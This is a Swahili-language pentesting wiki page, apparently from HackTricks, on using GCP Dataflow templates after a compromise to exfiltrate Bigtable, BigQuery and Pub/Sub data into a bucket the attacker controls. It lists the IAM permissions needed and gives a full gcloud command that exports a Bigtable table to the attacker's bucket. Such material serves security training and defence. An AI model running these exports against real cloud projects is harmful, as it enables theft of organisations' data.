# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Kwa taarifa zaidi kuhusu Dataflow angalia:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Kutumia Dataflow ku-exfiltrate data kutoka kwa huduma nyingine

**Ruhusa:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (kwa SA yenye ufikiaji kwa source na sink)

Ikiwa una haki za kuunda job za Dataflow, unaweza kutumia templates za GCP Dataflow ku-export data kutoka Bigtable, BigQuery, Pub/Sub, na huduma nyingine hadi GCS buckets zinazodhibitiwa na mshambulizi. Hii ni mbinu yenye nguvu ya post-exploitation wakati umetapata access ya Dataflow—kwa mfano kupitia [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Unahitaji `iam.serviceAccounts.actAs` kwa service account yenye ruhusa za kutosha za kusoma source na kuandika kwenye sink. Kwa chaguo-msingi, Compute Engine default SA inatumika ikiwa haibainishwi.

#### Bigtable to GCS

Angalia [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" kwa pattern kamili. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Hamisha Bigtable kwenda bucket inayodhibitiwa na mshambulizi</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery to GCS

Templates za Dataflow zipo za kuhamisha data ya BigQuery. Tumia template inayofaa kwa muundo unaolengwa (JSON, Avro, n.k.) na elekeza matokeo kwenye bucket yako.

#### Pub/Sub na vyanzo vya streaming

Pipelines za streaming zinaweza kusoma kutoka Pub/Sub (au vyanzo vingine) na kuandika kwa GCS. Anzisha job kwa kutumia template inayosoma kutoka kwenye subscription lengwa ya Pub/Sub na kuandika kwenye bucket unayodhibiti.

## Marejeleo

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
